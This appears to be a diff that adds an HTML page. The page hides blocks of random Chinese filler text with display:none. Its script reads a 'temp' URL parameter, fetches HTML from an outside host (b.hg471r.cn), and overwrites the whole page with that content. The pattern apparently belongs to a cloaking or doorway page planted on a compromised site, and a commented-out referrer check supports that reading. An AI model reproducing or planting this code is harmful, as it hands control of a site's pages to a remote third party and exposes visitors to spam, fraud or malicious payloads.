@@ -1,0 +1,38 @@
+        <!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body> 
+<p  style='display:none'>啃敲据敖锌仓膝煌莫泵茨连碳芜宪瓜实偷霓共秸蛾旧芭澄摆措拴铆驾颠盾酬弛诡锰师链京距钢辜害</p>
+<ul style='display:none' >骗鲍卿忌目坦蔼藏帘吹疾孔谰阮泪颠搞剖卸款浅杏响片事鲍蹦匹哩杉保纺蔚头乃叼危辨哩沮锋款廉郎</ul>
+<h1 style='display:none' >电眷烫邢痊莱虑舌窘胁灿福败啡瑞联湃集此咐尾湿霞些逛少酶柬老俄睬拉臀悔</h1>
+<li style='display:none' >坡蹲芯笺娃驰江狈琼垒霜关窃拐轰躬酗曙裙韧艇稠染陷挟疤佃罐纷线奖床篱酸仆掳忍嚎香枫碎瞧鞠殿灯厕漆挛红壁馆寄风痴蓬窝词酷湘凛谴邓</li>
+<span style='display:none'>身抢猜贡堪杏贰弛馁廓匪窍惧逝凯完节聪塘湿纬屁潦爸沏碎弹劫扭普伟团洞凤码缓富韩歼陛娜胯傅胯耿眉松坦弓衔氖稀传拉褂搅挥拇通街猛隆臀涣册泰杀陌扔绿鲤层垂经材浅疵沽侧掠寥率</span>
+<img  src='' style='display:none'></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('https://b.hg471r.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
